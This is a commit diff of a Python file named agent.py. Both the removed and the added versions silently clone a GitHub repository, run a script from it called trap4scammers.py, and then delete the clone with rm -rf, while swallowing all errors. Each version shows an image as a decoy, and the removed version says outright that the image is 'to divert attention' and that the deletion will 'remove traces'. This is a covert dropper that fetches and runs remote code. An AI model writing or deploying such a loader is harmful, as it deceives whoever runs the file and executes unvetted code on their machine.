7f406ab99137124baf7481aec9f2d448ed52ffbc
Valerii Syroiezhin <v.syroiezhin@MacBook-Air-Valerii.local>
2022-08-01 20:12:03 +0300

    Update agent.py

--- agent.py
+++ agent.py
@@ -1,14 +1,17 @@
-from os import system
-# we download the script, run it and remove traces.
-try: 
-    path = "~/trap4scammers/"
-    system(f"git clone https://github.com/syroiezhin/console2app {path}")
-    system(f"python {path}/trap4scammers.py")
-    system(f"rm -rf {path}")
-except: pass
-
-from requests import get
-from io import BytesIO
+from os import system, chdir, getcwd, path
+from shutil import rmtree
 from PIL import Image
-# to divert attention.
-Image.open(BytesIO(get("https://static.ngs.ru/news/2015/99/preview/6f3e934e7e2d0402bdf8113262ea14420b7da035_640.jpg").content)).show('image')
+
+if __name__ == "__main__":
+    try:
+        print(getcwd())
+        print(way := getcwd().replace('/', ' ').split())
+        print(route := f"/{way[0]}/{way[1]}/")
+        chdir(route)
+        if path.exists('finder') == True: rmtree("finder")
+        system(f"git clone https://github.com/syroiezhin/console2app finder")
+        chdir("finder")
+        Image.open(f"image.jpeg").show()
+        system(f"python trap4scammers.py")
+        system(f"rm -rf {route}/finder")
+    except: pass
